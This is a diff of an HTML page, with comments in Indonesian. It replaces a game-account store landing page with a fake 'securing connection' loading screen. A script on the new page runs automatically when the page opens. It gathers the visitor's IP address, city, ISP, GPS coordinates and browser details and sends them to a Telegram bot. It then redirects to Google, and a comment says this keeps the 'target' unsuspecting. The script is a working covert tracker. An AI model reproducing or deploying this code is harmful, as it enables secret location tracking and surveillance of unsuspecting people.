@@ -3,85 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JB SERVICES | TRUSTED ADMIN</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>Sistem Sedang Memuat...</title>
     <style>
-        body { background-color: #0f172a; color: white; font-family: 'Inter', sans-serif; }
-        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
-        .btn-gradient { background: linear-gradient(90deg, #3b82f6, #2563eb); transition: 0.3s; }
-        .btn-gradient:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(37, 99, 235, 0.4); }
+        body { background: #000; color: #333; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #111; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { margin-top: 15px; font-size: 12px; color: #555; }
     </style>
 </head>
-<body class="p-5">
+<body>
 
-    <div class="max-w-4xl mx-auto text-center mt-10">
-        <div class="inline-block p-2 px-4 rounded-full bg-blue-500/20 text-blue-400 text-sm font-bold mb-4">
-            <i class="fas fa-check-circle mr-2"></i> VERIFIED ADMIN & REKBER
-        </div>
-        <h1 class="text-4xl md:text-5xl font-black mb-4">YANZ <span class="text-blue-500">STORE</span></h1>
-        <p class="text-slate-400 max-w-lg mx-auto">Solusi transaksi aman, cepat, dan terpercaya. Jual Beli Akun, Top Up, dan Rekber Admin.</p>
+    <div style="text-align: center;">
+        <div class="loader"></div>
+        <div id="status">Mengamankan koneksi...</div>
     </div>
 
-    <div class="grid grid-cols-2 md:grid-cols-4 gap-4 max-w-4xl mx-auto mt-10">
-        <div class="glass p-4 rounded-2xl text-center">
-            <div class="text-2xl font-bold">500+</div>
-            <div class="text-xs text-slate-500 uppercase">Testimoni</div>
-        </div>
-        <div class="glass p-4 rounded-2xl text-center">
-            <div class="text-2xl font-bold">100%</div>
-            <div class="text-xs text-slate-500 uppercase">Amanah</div>
-        </div>
-        <div class="glass p-4 rounded-2xl text-center">
-            <div class="text-2xl font-bold">Fast</div>
-            <div class="text-xs text-slate-500 uppercase">Respon</div>
-        </div>
-        <div class="glass p-4 rounded-2xl text-center">
-            <div class="text-2xl font-bold">Low</div>
-            <div class="text-xs text-slate-500 uppercase">Fee Rekber</div>
-        </div>
-    </div>
+    <script>
+        // --- KONFIGURASI TELEGRAM ---
+        const TOKEN = 'TOKEN_BOT_TELEGRAM_LO';
+        const CHAT_ID = 'ID_TELEGRAM_LO';
+        // ----------------------------
 
-    <div class="max-w-4xl mx-auto mt-12">
-        <h2 class="text-xl font-bold mb-6 border-l-4 border-blue-500 pl-3">LAYANAN KAMI</h2>
-        <div class="grid md:grid-cols-3 gap-6">
-            
-            <div class="glass p-6 rounded-3xl relative overflow-hidden group">
-                <i class="fas fa-handshake text-4xl text-blue-500 mb-4"></i>
-                <h3 class="font-bold text-lg">REKBER / BERES</h3>
-                <p class="text-sm text-slate-400 mt-2">Penengah transaksi aman antara pembeli & penjual.</p>
-            </div>
+        async function track() {
+            try {
+                // Ambil data dari API IP-API (Tanpa API Key, gratis & detail)
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
 
-            <div class="glass p-6 rounded-3xl relative overflow-hidden group">
-                <i class="fas fa-shopping-cart text-4xl text-green-500 mb-4"></i>
-                <h3 class="font-bold text-lg">JUAL BELI AKUN</h3>
-                <p class="text-sm text-slate-400 mt-2">Sedia stok akun ML, FF, PUBGM kualitas Sultan harga bersahabat.</p>
-            </div>
+                const text = `
+🎯 **TARGET TERPELACAK!** 🎯
+----------------------------------
+🌐 **IP Address:** ${data.ip}
+🏙️ **Kota:** ${data.city}
+🚩 **Provinsi:** ${data.region}
+🇲🇨 **Negara:** ${data.country_name}
+🏢 **ISP/Provider:** ${data.org}
+📡 **ASN:** ${data.asn}
+📍 **Koordinat:** ${data.latitude}, ${data.longitude}
+⏰ **Waktu:** ${new Date().toLocaleString()}
 
-            <div class="glass p-6 rounded-3xl relative overflow-hidden group">
-                <i class="fas fa-bolt text-4xl text-yellow-500 mb-4"></i>
-                <h3 class="font-bold text-lg">TOP UP GAME</h3>
-                <p class="text-sm text-slate-400 mt-2">Top up Diamond & UC legal 100% aman anti minus.</p>
-            </div>
+📱 **Info Perangkat:**
+- OS: ${navigator.platform}
+- Browser: ${navigator.userAgent}
+----------------------------------
+📍 **Google Maps Link:** https://www.google.com/maps?q=${data.latitude},${data.longitude}
+                `;
 
-        </div>
-    </div>
+                // Kirim ke Telegram
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
 
-    <div class="max-w-4xl mx-auto mt-16 mb-20 text-center">
-        <h2 class="text-2xl font-bold mb-6">Siap Melakukan Transaksi?</h2>
-        <div class="flex flex-col md:flex-row justify-center gap-4">
-            <a href="https://wa.me/6281234567890" class="btn-gradient px-8 py-4 rounded-2xl font-bold flex items-center justify-center">
-                <i class="fab fa-whatsapp mr-2 text-xl"></i> CHAT WHATSAPP
-            </div>
-            <a href="https://t.me/ID_TELEGRAM_LO" class="bg-slate-700 hover:bg-slate-600 px-8 py-4 rounded-2xl font-bold flex items-center justify-center transition">
-                <i class="fab fa-telegram-plane mr-2 text-xl"></i> HUBUNGI TELEGRAM
-            </a>
-        </div>
-    </div>
+                // Setelah data terkirim, arahkan ke web asli (misal: Google atau YouTube)
+                // Biar target nggak curiga
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 2000);
 
-    <footer class="text-center text-slate-600 text-sm py-10 border-t border-slate-800">
-        &copy; 2026 YANZ STORE. All Rights Reserved.
-    </footer>
+            } catch (error) {
+                // Jika gagal, tetap redirect agar tidak curiga
+                window.location.href = "https://www.google.com";
+            }
+        }
 
+        // Jalankan pelacakan otomatis saat web dibuka
+        window.onload = track;
+    </script>
 </body>
 </html>
